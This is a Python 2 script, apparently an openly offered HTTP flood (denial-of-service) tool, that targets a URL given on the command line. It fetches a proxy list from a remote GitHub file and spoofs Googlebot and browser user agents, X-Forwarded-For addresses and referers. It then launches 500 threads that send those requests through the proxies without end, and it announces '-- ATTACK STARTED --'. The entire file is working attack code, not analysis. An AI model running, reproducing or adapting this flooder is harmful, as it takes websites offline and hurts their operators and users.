#!/usr/bin/env python
#coding: utf8
#Edit and Update by: webr00t
#Jun 30th 2018
 
import random
import socket
import threading
import time
import sys
import urllib2

global host_url
userAgents = [
	'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html',
	'Googlebot/2.1 (+http://www.googlebot.com/bot.html',
	'Googlebot/2.1 (+http://www.google.com/bot.html',
	'Mozilla/5.0 (Windows NT 6.1 AppleWebKit/537.36 (KHTML, like Gecko Chrome/41.0.2228.0 Safari/537.36',
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1 AppleWebKit/537.36 (KHTML, like Gecko Chrome/41.0.2227.1 Safari/537.36',
	'Mozilla/5.0 (Windows NT 6.1; WOW64 AppleWebKit/537.36 (KHTML, like Gecko Chrome/41.0.2227.0 Safari/537.36',
	'Mozilla/5.0 (X11; Linux x86_64 AppleWebKit/537.36 (KHTML, like Gecko Chrome/41.0.2227.0 Safari/537.36',
	'Mozilla/5.0 (Windows NT 6.3; rv:36.0 Gecko/20100101 Firefox/36.0',
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0 Gecko/20100101 Firefox/33.0',
	'Mozilla/5.0 (X11; Linux i586; rv:31.0 Gecko/20100101 Firefox/31.0',
	'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm',
	'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0 like Gecko']


 
def randomIp():
    random.seed()
    result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.'
    result = result + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
    return result
def random_str_2(size):
    out_str = ''
    letters = 'abcdefghijklmnopqrstuvwxyz'
    for i in range(size):
        out_str += random.choice(letters)
    return (out_str)
def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(2, 8)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]
 
def randomUserAgent():
    return random.choice(userAgents)
 
def randomReFerer():
    return random.choice(reFerers)  
 
class attacco(threading.Thread):
    def run(self):
        current = x
       
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')
		
        get_host = "GET " + url + random_str_2(8) + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
        accept = "Accept-Encoding: gzip, deflate\r\n"
        connection = "Connection: Keep-Alive\r\n"
        cache = "Cache-Control: no-cache\r\n"
        keep = "Keep-Alive: " + str(random.randint(300,500)) + "\r\n"
        accept0 = "Accept-Language: tr-tr,tr;q=0.8,en-us;q=0.5,en;q=0.3\r\n"
        accept1 = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
        accept2 = "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,image/jpg,image/gif,*/*;q=0.5\r\n"
        randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        useragent = "User-Agent: " + randomUserAgent() + "\r\n"
        forward = "X-Forwarded-For: " + randomip + "\r\n"
        referer   = "Referer: "+ randomReFerer() + "\r\n"
        httprequest = get_host + useragent + forward + referer + accept  + connection + keep + cache + accept0 + accept1 + accept2 +"\r\n"

        while nload:
            time.sleep(1)
           
        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(httprequest)
                try:
                    for i in xrange(3):
                        a.send(httprequest)
                except:
                    tts = 1
 
                   
            except:
                proxy = random.choice(listaproxy).split(':')
 
 
 

# Site
url = sys.argv[1]
host_url = url.replace("http://", "").replace("https://", "").split('/')[0]

reFerers = [
	'https://www.google.com.tr/',
	'http://' + host_url + '/'
]
#Proxy
yanit  = urllib2.urlopen('https://raw.githubusercontent.com/webr00t/web/master/p.txt')
yanit_text = yanit.read()
yanit_text.close()
listaproxy = yanit_text.split('\n')


thread = 500
nload = 1
x = 0
 
for x in xrange(thread):
    attacco().start()
print "-- ATTACK STARTED --"
nload = 0
while not nload:
    time.sleep(1)

